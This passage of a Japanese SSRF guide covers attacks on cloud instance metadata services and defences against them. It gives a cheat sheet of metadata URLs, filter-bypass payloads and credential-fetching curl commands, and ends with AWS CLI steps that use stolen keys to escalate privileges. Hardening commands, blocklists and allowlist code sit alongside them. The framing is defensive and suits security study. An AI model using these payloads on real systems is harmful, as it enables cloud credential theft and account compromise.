aws ec2 modify-instance-metadata-options \
  --instance-id $INSTANCE_ID \
  --http-tokens required \
  --http-endpoint enabled
```

```hcl
# Terraformで新規/既存インスタンスに恒久設定する場合
metadata_options {
  http_tokens                 = "required"
  http_put_response_hop_limit = 1
}
```

`http_tokens = "required"`によってIMDSv1のGETのみのリクエストは拒否される（`401`を返す）ようになるため、単純なSSRFでは窃取できなくなる。ただし前述の通り、PUTを含む任意メソッドを発行できるSSRFには効果が限定的である点は覚えておく必要がある。

**2. アプリケーション層での出力検証（多層防御の一段目）**

- スキームをhttp/httpsのみに制限する。
- ユーザー指定URLのホスト名を解決した上で、解決後のIPアドレスをブロックリストと照合する（DNSリバインディング対策として、検証時と実際のリクエスト時のIPが一致することも確認する）。
- 以下のプライベート/リンクローカルCIDRへのアウトバウンドを拒否する。

```
10.0.0.0/8        # プライベート
172.16.0.0/12     # プライベート
192.168.0.0/16    # プライベート
169.254.0.0/16    # リンクローカル（IMDSはここに含まれる）
127.0.0.0/8       # ループバック
```

**3. 権限の最小化（クレデンシャルが盗まれても被害を抑える）**

IAMロールに対して最小権限の原則を適用し、可能であれば`aws:SourceIp`などの条件付きポリシーでリソースレベルの制限をかける。これにより、万一クレデンシャルが窃取されても被害範囲（blast radius）を限定できる。

**4. SCP（Service Control Policy）とSSMによる組織全体の統制**

AWS Organizationsのサービスコントロールポリシーで、IMDSv2を強制しないインスタンス起動自体を拒否する、あるいはAWS SSM Automationドキュメントで既存インスタンスに一括してIMDSv2強制を適用する、という組織レベルの統制も有効な手段として挙げられている。

> 出典: RKON「Exploit SSRF to gain AWS Credentials」— https://www.rkon.com/articles/exploit-ssrf-to-gain-aws-credentials/

これら3資料に共通する結論は一つである。IMDSv1が「認証なしでローカルHTTPリクエストに応答する」という設計そのものが脆弱性の根であり、SSRFはその設計上の弱点を外部から突くための「入り口」に過ぎない。したがって最も確実な対策はSSRF自体を潰すことではなく（アプリケーションは増え続け、すべてのSSRFを潰しきることは現実的ではない）、**IMDSv2の強制という基盤側の設計変更によって、SSRFが成立してもクレデンシャル窃取まで到達させない**という多層防御の発想である。

## SSRFクラウドメタデータURLチートシート

SSRF（Server-Side Request Forgery、サーバーサイドリクエストフォージェリ）は、攻撃者が指定したURLをサーバー自身に代わりに取得させることで、本来アクセスできないはずの内部リソースへ到達させる脆弱性である。クラウド環境ではこの内部リソースの中でも特に危険なのが「インスタンスメタデータサービス（IMDS: Instance Metadata Service）」である。IMDSは各クラウドプロバイダがVM/コンテナに対して、リンクローカルアドレス（`169.254.169.254`など、ルーティングされずインスタンス自身からしか到達できない特殊なIPレンジ）経由で提供する内部APIで、インスタンスの設定情報に加えて、そのインスタンスに割り当てられたIAMロール（クラウド上のリソースにアクセスするための権限セット）の**一時クレデンシャル**を平文で返す。SSRFでこのエンドポイントに到達できれば、攻撃者はサーバーのミドルウェアやアプリケーションコードを一切経由せずに、クラウドAPIを直接叩ける認証情報を丸ごと窃取できる。本節は、主要クラウド各社のメタデータURLと、そこに到達するための前提条件（必要ヘッダー、トークン取得手順など）を一覧化したチートシートである。

### なぜメタデータサービスが「刺さる」のか（仕組み）

IMDSの設計思想は「同一ホスト上のプロセスからしか到達できないアドレスに機微情報を置けば安全」というものである。`169.254.0.0/16`はRFC 3927で定義されたリンクローカルアドレス空間で、ルータを越えて転送されない。つまり本来は「サーバー自身のプロセス」だけがこのアドレスに到達できる想定だった。

しかしSSRF脆弱性が存在すると、この前提が崩れる。アプリケーションが「URLを受け取ってそこにリクエストを送る」処理（画像のプレビュー取得、Webhook配信、外部APIへのプロキシ、PDF生成時のURL埋め込みなど）を持っていて、かつ送信先URLの検証が不十分な場合、攻撃者は`url=http://169.254.169.254/...`のような入力を渡すだけで、**サーバー自身に**このリクエストを代行させられる。リクエストの送信元はサーバー自身のネットワークインターフェースなので、リンクローカルアドレスへの到達制限は無意味になる。これがクラウド環境でSSRFが「即クレデンシャル窃取」に直結する理由である。

### AWS EC2 — IMDSv1 / IMDSv2

AWSのEC2インスタンスメタデータサービスには2つのバージョンが存在する。

**IMDSv1（トークン不要、旧方式）**

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
```

`iam/security-credentials`にロール名なしでGETすると、そのインスタンスにアタッチされているIAMロール名の一覧が返る。続けてロール名を付けてGETすると、`AccessKeyId`・`SecretAccessKey`・`SessionToken`・`Expiration`を含むJSONが返る。これはIAMロールがEC2に一時的に発行するSTS（Security Token Service）クレデンシャルそのものであり、これをAWS CLIやSDKの環境変数に設定すれば、そのIAMロールが持つ全権限（S3バケット読み書き、他のEC2操作、場合によってはアカウント全体の管理者権限）をそのまま行使できる。

IMDSv1はGETリクエスト一発で機微情報が取れてしまうため、単純なSSRF（レスポンスがそのままアプリの画面に表示される、いわゆる非ブラインドSSRF）はもちろん、URLをフェッチさせるだけのブラインドSSRF（リクエストは飛ぶがレスポンス内容は見えないタイプ）でも、外部にデータを持ち出す工夫（Out-of-Band経由の外部送信を組み込んだサーバーサイドコードへの2次攻撃など）と組み合わせて悪用されてきた。

**IMDSv2（トークン必須、2019年導入・現在の推奨方式）**

IMDSv2はAWSがSSRF対策として導入した方式で、GETの前に**PUTリクエストでセッショントークンを取得**することを必須にする。

```bash
# 手順1: トークン取得（PUTメソッド + TTLヘッダーが必要）
curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  "http://169.254.169.254/latest/api/token"

# 手順2: 取得したトークンをヘッダーに付けてGET
curl -H "X-aws-ec2-metadata-token: <取得したトークン>" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

これがなぜ防御になるかというと、多くのSSRFの悪用経路は「アプリが受け取ったURLに対してGETリクエストを送る」だけの単純なプロキシ挙動であり、**HTTPメソッドの指定や任意ヘッダーの付与**までは攻撃者が制御できないケースが多いからである。PUTメソッドを要求することで、GETしか発行しない典型的なSSRF実装（画像取得、Webhookなど）を無力化できる。

ただし万能ではない。攻撃者がSSRFの対象となるアプリで**HTTPメソッドとカスタムヘッダーを自由に指定できる**場合（プロキシ機能やWebhook検証機能が任意のヘッダー転送を許してしまう実装など）は、IMDSv2でもトークン取得からフルに悪用できる。2025年に報告されたTypebot.ioのWebhook機能の脆弱性（GHSA-8gq9-rw7v-3jpr）はまさにこのパターンで、カスタムヘッダー注入によりIMDSv2トークンを取得し、EKS（AWSのKubernetesサービス）のクレデンシターを窃取された。したがってIMDSv2は「多くの単純なSSRFを防ぐ緩和策」であって「SSRF自体を無害化する対策」ではないと理解する必要がある。

IPv6環境ではリンクローカルアドレスに加えて次のエンドポイントも存在する。

```
http://[fd00:ec2::254]/latest/meta-data/
```

またWAF（Web Application Firewall）による`169.254.169.254`という文字列のブラックリスト検出を回避するため、IPアドレスの別表記が使われることがある。

```
http://2852039166/                  # 10進数表記
http://0xA9FEA9FE/                  # 16進数表記
http://0251.0376.0251.0376/         # 8進数表記
```

これらはOSやライブラリの`inet_aton`系関数がRFC準拠外の表記（先頭ゼロを8進数として解釈する、4オクテットではなく単一の32bit整数として解釈するなど）を許容してしまうことを悪用したものである。パーサ（文字列を構造化データへ変換する処理）ごとに許容範囲が異なるため、単純な文字列マッチによるフィルタは容易にすり抜けられる。

**ECS（Elastic Container Service）タスクメタデータ**

コンテナ環境ではエンドポイントが異なる。

```
http://169.254.170.2/v2/credentials/<UUID>
```

このUUIDはコンテナ内の環境変数`AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`または`/proc/self/environ`から取得できる。SSRFに加えてファイル読み取り（LFI）やSSRF経由の`/proc/self/environ`アクセスができれば、このUUIDを取り出してタスクロールのクレデンシャルを窃取できる。

**Lambda Runtime API**

```
http://localhost:9001/2018-06-01/runtime/invocation/next
http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next
```

Lambda環境でSSRFが起きると、実行中の関数呼び出しイベント自体を横取りできる可能性がある。

> 出典: PayloadsAllTheThings — SSRF-Cloud-Instances.md — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/SSRF-Cloud-Instances.md（GitHub Pages版: https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Request%20Forgery/SSRF-Cloud-Instances/）

### Google Cloud Platform（GCP）

GCPのメタデータサービスはAWSと異なり、**特定ヘッダーの付与を必須**にすることでSSRF対策を図っている。

```
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
```

必須ヘッダーはいずれか一方でよい。

```
Metadata-Flavor: Google
```

または

```
X-Google-Metadata-Request: True
```

```bash
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

主要な取得対象パスは以下の通り。

```
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

ヘッダー必須という設計は、AWS IMDSv2のPUTメソッド要求と同じ狙いを持つ——単純なURLフェッチ型SSRFでは任意ヘッダーを付けられないことが多いため、これだけで多くの悪用経路を塞げる。しかし、この防御には歴史的な抜け穴があった。**`v1beta1`という旧APIバージョン**は、ヘッダーなしでもアクセスできる（すでに非推奨だが後方互換のため長らく残っていた）。

```
http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json
```

`kube-env`はGKE（Google Kubernetes Engine）のノードに残る設定情報で、クラスタ証明書やkubeletの認証情報を含むことがある。防御側の対策としては、GCPコンソールやAPI経由でこの`v1beta1`レガシーエンドポイントを無効化する設定が有効である。

> 出典: PayloadsAllTheThings — SSRF-Cloud-Instances.md — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/SSRF-Cloud-Instances.md

### Microsoft Azure

AzureのIMDSも必須ヘッダー方式を採用している。

```
Metadata: true
```

```
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/v1/maintenance
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
```

より新しいバージョンでは、Managed Identity（Azureが自動的にリソースへ紐づける認証用のIDで、パスワード管理なしでAzure ADトークンを取得できる仕組み）用のトークンエンドポイントも重要な標的になる。

```
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

`Metadata: true`ヘッダーはブラウザのXHR/Fetchでは付与できないカスタムヘッダーであり、CSRF経由の悪用を防ぐ意味合いもあるが、サーバーサイドのSSRFでヘッダー制御が可能な場合は依然として突破される。

> 出典: Vulnsy SSRF Cheat Sheet — https://www.vulnsy.com/cheat-sheets/ssrf

### その他の主要クラウド・オンプレ基盤

以下は認証ヘッダー不要、またはシンプルな構成のため、SSRFが成立すればほぼ即座に情報漏洩に至るプロバイダ群である。

**DigitalOcean**（ヘッダー不要）

```
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
http://169.254.169.254/metadata/v1.json    # 全項目を一括取得
```

**Oracle Cloud Infrastructure（OCI）**

旧世代エンドポイント（ヘッダー不要）:

```
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
```

現行のv2エンドポイントは`Bearer Oracle`という固定のAuthorizationヘッダーを要求する設計に変わっている。

```
http://169.254.169.254/opc/v2/instance/
```

Authorizationヘッダー: `Bearer Oracle`

**Alibaba Cloud**（ヘッダー不要）

```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```

**Hetzner Cloud**（ヘッダー不要）

```
http://169.254.169.254/hetzner/v1/metadata/hostname
http://169.254.169.254/hetzner/v1/metadata/instance-id
http://169.254.169.254/hetzner/v1/metadata/public-ipv4
http://169.254.169.254/hetzner/v1/metadata/private-networks
```

**OpenStack / HP Helion**

```
http://169.254.169.254/openstack
http://169.254.169.254/2009-04-04/meta-data/
```

**コンテナ・オーケストレーション層（SSRFがLFIやRCEに直結しやすい）**

```
# Kubernetes etcd（認証なしで公開されていることがある）
http://127.0.0.1:2379/v2/keys/?recursive=true

# Docker Engine API（Unixソケットではなくtcp:2375で公開されている場合）
http://127.0.0.1:2375/v1.24/containers/json
http://127.0.0.1:2375/v1.24/images/json
curl --unix-socket /var/run/docker.sock http://foo/containers/json
```

Docker APIやKubernetes etcdはクラウドメタデータではないが、SSRFの到達先としてしばしば同列に語られる。これらが認証なしでリッスンしていると、コンテナの起動・停止、新規コンテナの作成（ホストのファイルシステムをマウントしたコンテナを起動すればホストへのRCEに直結）が可能になるため、クラウドクレデンシャル窃取と並ぶ重大な到達点である。

> 出典: PayloadsAllTheThings — SSRF-Cloud-Instances.md — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/SSRF-Cloud-Instances.md

### メタデータIPへの到達を妨げるフィルタのバイパス

多くのアプリケーションは「`169.254.169.254`という文字列を含むURLを拒否する」「プライベートIPレンジへのリクエストを拒否する」といった素朴なブロックリスト方式の対策を実装している。しかしURL文字列の解釈はパーサ（ブラウザ、HTTPクライアントライブラリ、正規表現による検証コードなど）ごとに揺れがあり、これを突くバイパス手法が数多く存在する。

**IPアドレスの別表記によるバイパス**

```
http://[::ffff:169.254.169.254]/        # IPv4射影IPv6アドレス
http://0251.0376.0251.0376/             # 8進数
http://0xA9FEA9FE/                      # 16進数（32bit整数の16進表記）
http://2852039166/                      # 10進数（32bit整数表記）
http://169.254.169.254.nip.io/          # 任意サブドメインを指定IPに解決するDNSサービス
```

これらが機能する原理は、多くの言語のURLパーサ・IP検証関数が「厳密なドット区切り4オクテット10進数」以外の表記（32bit整数一発、8進数プレフィックスの`0`、16進数プレフィックスの`0x`など）も内部的には有効なIPアドレスとして解釈してしまうことにある。文字列レベルで`169.254.169.254`をブロックリストに入れるだけの実装は、この別表記を素通りさせる。

**パーサ混同（URLの構成要素解釈の不一致）を突くバイパス**

```
http://expected-host:fake@evil-host/
http://evil-host#expected-host
http://expected-host.evil-host/
```

これはOrange Tsaiが提唱した「A New Era of SSRF」の研究で知られる手法で、URLの「検証に使われるパーサ」と「実際にリクエストを送るHTTPクライアントのパーサ」が異なるライブラリ・異なる実装だった場合、両者が「どこがホスト名か」の解釈で食い違うことを突く。例えば検証ロジックは`@`より前をユーザー情報として無視し`expected-host`をホストとみなすが、実際にリクエストを発行するクライアントは`@`より後ろの`evil-host`に接続する、といった食い違いが起こり得る。

**オープンリダイレクトの連鎖**

```
?url=https://allowed.example.com/redirect?to=http://169.254.169.254/latest/meta-data/
```

送信先ドメインをホワイトリスト検証するだけで、**リダイレクト先までは検証しない**実装に対する攻撃である。最初のリクエストは許可ドメインへ向くため検証を通過するが、307/308などのHTTPリダイレクトレスポンスによって最終的な接続先がメタデータIPへ誘導される。検証時と実際のフェッチ時で別々のHTTPクライアント呼び出しが行われる実装や、リダイレクトを自動追従する設定になっているHTTPクライアントで特に危険である。

**DNSリバインディング**

```
http://make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms/
```

これは「検証時のDNS解決」と「実際に接続する際のDNS解決」を分離し、TTL（DNSキャッシュの有効期限）を極端に短く設定することで、1回目の名前解決では許可された公開IPを返し、2回目（実際の接続時）の名前解決では内部IP（メタデータIP）を返す攻撃である。多くの「URLを検証してから接続する」実装は、検証と接続の間に時間差があり、かつ両方が別個にDNS解決を行うため、この時間差を突かれる。防御としては、**1回だけ名前解決してそのIPに対して直接ソケットを張り、Hostヘッダーだけ元のホスト名を使う「DNSピン留め」**が有効とされる。2026年にCraft CMSで報告されたCVE-2026-27127も、まさにこのDNSリバインディングによるメタデータブロックリスト回避の事例である。

> 出典: PayloadsAllTheThings — SSRF README — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md ／ Vulnsy SSRF Cheat Sheet — https://www.vulnsy.com/cheat-sheets/ssrf

### 検出シグナル（防御側・診断側の視点）

自組織のアプリケーションにSSRFが存在するかを調査する際、レスポンスや挙動に現れる以下のシグナルが手がかりになる。

- **クラウドクレデンシャルの漏洩シグナル**: レスポンスボディに`AccessKeyId`、`SecretAccessKey`、`Token`、`Expiration`（AWS）、`aliases`、`service-accounts/`（GCP）、`compute.vmId`や`network.interface[].ipv4.ipAddress.privateIpAddress`（Azure）といったキーが含まれていないか。
- **ブラインドSSRFの兆候**: レスポンスは変化しないが、外部から観測可能なDNSクエリだけが発生する（Out-of-Band Application Security Testing、通称OASTサービスを使って検知する）。
- **ポートスキャン的挙動の兆候**: 内部の開いているポートと閉じているポートでレスポンス時間や振る舞いに差が出る（開いているポートは即座に接続確立、閉じているポートはTCPタイムアウトまで待たされるなど）。

### 防御策のまとめ

- **IMDSv2の強制**: AWSであれば以下のようにIMDSv1を無効化し、トークン必須・ホップ数制限を設定する。

```bash
aws ec2 modify-instance-metadata-options \
  --instance-id i-0123456789abcdef0 \
  --http-tokens required \
  --http-put-response-hop-limit 1
```

`--http-put-response-hop-limit 1`は、メタデータへのリクエストがコンテナ経由などでさらに転送されるホップ数を1に制限し、リバースプロキシ越しの間接アクセスを難しくする設定である。

- **ネットワーク層でのブロック**: 出口プロキシやVPCのルーティングテーブルレベルで、アプリケーションサーバーから`169.254.169.254`および`RFC1918`（プライベートIP全域）への直接到達を遮断し、必要な場合のみ専用プロキシ経由でアクセスさせる。
- **許可リスト方式への転換**: 「ユーザーが完全なURLを直接指定できる」設計自体を避け、あらかじめ登録済みのID・キーからサーバー側が内部で持つ固定URLへマッピングする方式に変更する。

```javascript
// 危険な実装：ユーザーが完全なURLを直接指定できる
const { url } = await request.json();
const body = await fetch(url).then((r) => r.text());

// 安全な実装：登録済みIDから内部マップを参照するだけ
const FEEDS = {
  press: "https://press.example.com/rss.xml",
  support: "https://support.example.com/feed.xml",
};
const { feed } = await request.json();
const target = FEEDS[feed];
if (!target) throw new Error("unknown feed");
const body = await fetch(target).then((r) => r.text());
```

この対策が本質的に強い理由は、攻撃者が制御できる入力（`feed`という識別子）が、最終的にリクエスト先URLへ直接反映されない点にある。バイパス手法の多くはURL文字列の解釈揺れを突くものなので、そもそも「攻撃者が入力したURLをリクエストの宛先に使わない」設計であれば、パーサ混同やエンコーディングによるバイパスの対象そのものが存在しなくなる。

- **IAMロールの最小権限化**: 万一クレデンシャルが窃取されても被害を限定できるよう、インスタンスにアタッチするIAMロールの権限は必要最小限にとどめ、可能であればメタデータへのアクセス自体を専用のプロキシサービスアカウントに限定する。
- **DNSピン留め**: URLの検証と実際の接続を同一のIPに対して行い、検証後にDNSが再解決されないようにする。

### 実世界の事例（2024〜2026年）

| CVE / 識別子 | 年 | 概要 |
|---|---|---|
| GHSA-8gq9-rw7v-3jpr（Typebot.io） | 2025 | Webhook機能でのカスタムヘッダー注入によりIMDSv2トークンを取得し、EKSクレデンシャルを窃取 |
| CVE-2026-27127（Craft CMS） | 2026 | DNSリバインディングによりメタデータIPに対するブロックリストを回避 |
| CVE-2024-34351（Next.js Server Actions） | 2024 | Hostヘッダー操作により内部サービスへアクセス可能 |
| CVE-2025-57822（Next.js resolve-routes） | 2025 | ユーザー制御ヘッダーによるルート解決経由のSSRF |

これらの事例が示すように、IMDSv2やヘッダー必須方式といった対策が普及した2020年代後半でも、「アプリケーションがヘッダーやメソッドを自由に転送してしまう機能（Webhook、プロキシ機能など）」が存在する限り、SSRFからのクレデンシャル窃取は依然として現実的な脅威であり続けている。診断・防御の双方において、単一の対策に頼らず、ネットワーク層の遮断・許可リスト方式・最小権限化を多層的に組み合わせることが重要である。

> 出典: Vulnsy SSRF Cheat Sheet — https://www.vulnsy.com/cheat-sheets/ssrf

## IMDSv2の仕組みとバイパス（フィルタ回避の原理）

本節は防御を目的とした技術解説である。実在サービスや本番環境への無許可の検証、破壊的な操作は扱わない。あくまで「なぜ攻撃が成立するのか」「どう塞ぐか」を仕組みのレベルで理解することが狙いである。

前節までで、SSRF（Server-Side Request Forgery: サーバに任意の宛先へHTTPリクエストを送らせる脆弱性）が EC2 インスタンスのメタデータサービス（IMDS: Instance Metadata Service）に到達すると、そのインスタンスに紐づく IAM ロールの一時クレデンシャルが盗まれ得ることを見てきた。本節では、その対策として登場した **IMDSv2** が「なぜ多くの SSRF を防げるのか」、そして「それでもなお破られる３つの経路」と「SSRFフィルタを回避する各テクニックがなぜ機能するのか」を、パーサやプロトコルの挙動まで掘り下げて解説する。

---

### IMDS とは何か、なぜ狙われるのか

IMDS は、EC2 インスタンスの内部から `169.254.169.254` という **リンクローカルアドレス**（同一リンク内でのみ有効な、ルーティングされない特殊なIPアドレス帯 `169.254.0.0/16`）に対してHTTPでアクセスすると、そのインスタンス自身の情報（インスタンスID、リージョン、ネットワーク設定など）を返してくれるサービスである。

問題は、インスタンスに IAM ロールが割り当てられている場合、`iam/security-credentials/` 配下から **そのロールの一時クレデンシャル（AccessKeyId / SecretAccessKey / Token）が平文で取得できる** 点にある。これは AWS の設計として意図されたもので、SDK や CLI がインスタンス上で自動的に認証情報を得るために使う。しかし、これは「アプリが `169.254.169.254` へHTTPリクエストを送れば認証情報が漏れる」ことも意味する。SSRF はまさにその「任意の宛先へHTTPを送らせる」脆弱性なので、両者は極めて相性が悪い。

> 出典: Datadog Security Labs「Securing the EC2 Instance Metadata Service」 — https://securitylabs.datadoghq.com/articles/misconfiguration-spotlight-imds/

---

### IMDSv1 の攻撃チェーン（前提知識の整理）

まず攻撃者視点で、IMDSv1（旧方式）がどれほど無防備かを確認する。IMDSv1 は認証もトークンも不要な、単純なリクエスト・レスポンス型プロトコルであり、EC2 のデフォルトで有効になっている。SSRF の宛先に metadata IP を指定するだけで、以下の手順で認証情報まで到達できる。

```
# 1. SSRF が metadata に届くか確認
GET http://169.254.169.254/latest/meta-data/

# 2. インスタンスに紐づくロール名を列挙
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
→ ec2-app-production-role

# 3. ロールの一時クレデンシャルを取得
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-app-production-role
```

3番目のレスポンスには、次のように生の認証情報が含まれる。

```json
{
  "AccessKeyId": "ASIA3EXAMPLE...",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/...",
  "Token": "AQoDYXdzEJr...",
  "Expiration": "2026-04-26T18:00:00Z"
}
```

なぜこれで成立するのか。**IMDSv1 は「単純なGETリクエスト一発」で認証情報が返る**ため、SSRF が「攻撃者の指定したURLをGETするだけ」の最小機能しか持たなくても、そのまま悪用できてしまうからである。ヘッダも特殊なHTTPメソッドも要らない。ここが後述の IMDSv2 との決定的な差になる。

> 出典: CyberFortify「SSRF → IMDSv2 → STS」 — https://cyberfortify.co/blog/ssrf-imdsv2-sts-cloud-privilege-escalation

---

### IMDSv2 の仕組み（なぜ多くのSSRFを止められるのか）

IMDSv2 は 2019 年に導入された **セッション指向** の方式で、認証情報を得る前に「セッショントークン」の取得を必須にする。手順は必ず二段階になる。

**ステップ1: PUT リクエストでトークンを取得する**

```
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600
```

- `PUT` メソッドで `/latest/api/token` を叩く（`GET` では取得できない）。
- `X-aws-ec2-metadata-token-ttl-seconds`（トークンの有効秒数。最大21600秒＝6時間）を **リクエストヘッダで** 指定する必要がある。
- レスポンスとしてセッショントークン（例: `AQAAANjNkMq...`）が返る。

**ステップ2: 取得したトークンをヘッダに載せてメタデータへアクセスする**

```
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: AQAAANjNkMq...
```

- 以降のすべてのメタデータ取得で、`X-aws-ec2-metadata-token` **ヘッダ** にトークンを付与しないと `401 Unauthorized` になる。

#### なぜこの設計がSSRFに効くのか（防御原理）

IMDSv2 の効き目は、**「典型的なSSRFにはできないこと」を要求する**点にある。仕組みレベルで３つの障壁がある。

1. **HTTPメソッドの制約（PUTの強制）**: 多くのSSRFは「アプリがサーバ内から指定URLをGETする」機能を悪用する形をとる。IMDSv2 はトークン取得に `PUT` を強制するため、GET しかできないSSRFではトークンそのものを得られない。

2. **カスタムリクエストヘッダの強制**: トークン取得時（TTLヘッダ）とメタデータ取得時（tokenヘッダ）の両方で、**攻撃者が任意のリクエストヘッダを設定できること**が前提になる。Datadog は「敵対者がSSRFを通じてリクエストヘッダを設定できる可能性は低い」と述べている。画像取得やWebhookのような素朴なSSRFは、宛先URLは操作できてもヘッダまでは操作できないことが多い。

3. **ネットワーク層のTTL防御（ホップ制限）**: IMDSv2 はデフォルトで、セッショントークンを含むTCPパケットの **TTL（Time To Live: パケットが通過できるルータ/ホップの残り数）を「1」** に設定する。TTL=1 のパケットは最初のルータを越えられずに破棄される。これにより、**設定を誤ったリバースプロキシやNATが誤ってメタデータのパケットを外部へ転送してしまう事故を防ぐ**。加えて、IMDSv2 はトークン取得リクエストに `X-Forwarded-For` ヘッダが含まれていると拒否する。これは「プロキシ経由で転送されてきたリクエスト」を弾くためで、リバースプロキシ型のSSRFを塞ぐ狙いがある。

> 出典: Datadog Security Labs「Securing the EC2 Instance Metadata Service」 — https://securitylabs.datadoghq.com/articles/misconfiguration-spotlight-imds/

#### 重要な数値: 93%がIMDSv2を「強制」していない

IMDSv2 は「使える」だけでは意味がなく、IMDSv1 を **無効化して強制**（`HttpTokens: required`）しないと防御にならない。ところが Datadog Security Labs の調査では、**2022年9月時点で全EC2インスタンスの最大93%が IMDSv2 の利用を強制していない** とされている。つまり大半の環境では IMDSv1 が今なお併存しており、IMDSv2 という防御は「設定されているが強制されていない」状態に留まっている。これがクラウド侵害で metadata 経由の認証情報窃取が繰り返し起きる構造的な理由である。

> 出典: Datadog Security Labs「Securing the EC2 Instance Metadata Service」 — https://securitylabs.datadoghq.com/articles/misconfiguration-spotlight-imds/

---

### IMDSv2 を破る３つのシナリオ

IMDSv2 は強力だが「単体で完全」ではない。CyberFortify は、IMDSv2 が強制されていても攻撃が成立し得る典型的な３パターンを整理している。

#### シナリオ1: アプリが任意のHTTPメソッド/ヘッダを代行してしまう

SSRFの舞台となる機能が、**PUT/POST や任意ヘッダの送信をサポートしている**場合、攻撃者はアプリ自身を「踏み台」にしてトークンを取得できる。Webhook配信機能や、汎用HTTPクライアントを内蔵したプロキシ機能などが該当する。

> 「脆弱な機能が PUT や POST リクエストを行う（Webhook配信、HTTPクライアントライブラリ）場合、アプリケーション自身が IMDSv2 トークンを取得でき、攻撃者はそれを経由してリクエストを連鎖させられる。」（CyberFortify）

原理: IMDSv2 の障壁は「攻撃者がメソッドとヘッダを制御できないこと」を前提にしている。SSRFのある機能がそもそも豊富なメソッド/ヘッダ操作を許していれば、その前提が崩れ、二段階のトークンフローをそのまま再現できてしまう。

#### シナリオ2: ホップ制限（HttpPutResponseHopLimit）の誤設定

IMDSv2 のTTL防御は `HttpPutResponseHopLimit`（PUTレスポンスのホップ制限）という設定値で調整される。コンテナ／サーバレス系ワークロードでは **デフォルトが1**（つまりメタデータのパケットは同一ホスト内でしか有効でない）。しかし、これを **2以上に引き上げてしまう**と、防御が弱まる。

> 「ホップ制限が1より大きい Lambda 関数や ECS タスクは、IMDSv2 が強制されていてもアプリケーション内部からのSSRFに対して脆弱になる。」（CyberFortify）

原理: コンテナ環境では、アプリのプロセスとメタデータエンドポイントの間に「もう1ホップ」挟まる構成があり得る（例: Podのネットワーク名前空間からノードのメタデータへ）。ホップ制限を2にすると、その追加ホップを越えてパケットが届くようになる。ところが同時に、コンテナ内のアプリからのSSRFパケットも「越えられる」ようになってしまい、防御の意図に反して攻撃面が開く。**ホップ制限はネットワーク距離に応じて必要最小限（可能なら1）に絞るべき**なのは、この「必要な1ホップ」と「攻撃者の1ホップ」が同じ経路を共有するためである。

#### シナリオ3: IMDSv1 がまだ有効なまま（強制されていない）

前述の93%問題そのものである。IMDSv2 が「利用可能」でも、`HttpTokens: required` による強制がされていなければ IMDSv1 は生き続ける。特に2019年より前に作られたAWSアカウントでは、両バージョン併存がデフォルトのまま放置されがちである。攻撃者は難しい IMDSv2 を狙う必要すらなく、**単純なGET一発の IMDSv1 に落として**認証情報を取る。

原理: バージョンの「導入」と「強制」は別物である。旧方式を明示的に閉じない限り、攻撃者は常に最も弱い経路（IMDSv1）を選べる。防御は「最強の方式が使えること」ではなく「最弱の方式を塞ぐこと」で決まる。

> 出典: CyberFortify「SSRF → IMDSv2 → STS」 — https://cyberfortify.co/blog/ssrf-imdsv2-sts-cloud-privilege-escalation

---

### 窃取後: STS を用いた権限昇格の流れ

一時クレデンシャルを得た攻撃者は、それを環境変数に設定して AWS CLI/API を直接叩く。ここからが「メタデータ窃取」から「アカウント侵害」への橋渡しになる。

```bash
export AWS_ACCESS_KEY_ID="ASIA3EXAMPLE..."
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/..."
export AWS_SESSION_TOKEN="AQoDYXdzEJr..."

# ロールに付与されたポリシーを列挙して権限を把握
aws iam list-attached-role-policies --role-name ec2-app-production-role

# より広い権限を持つロールへ AssumeRole（横展開／昇格）
aws sts assume-role \
  --role-arn arn:aws:iam::123456789:role/DataPlatformAdminRole \
  --role-session-name pen-test-escalation
```

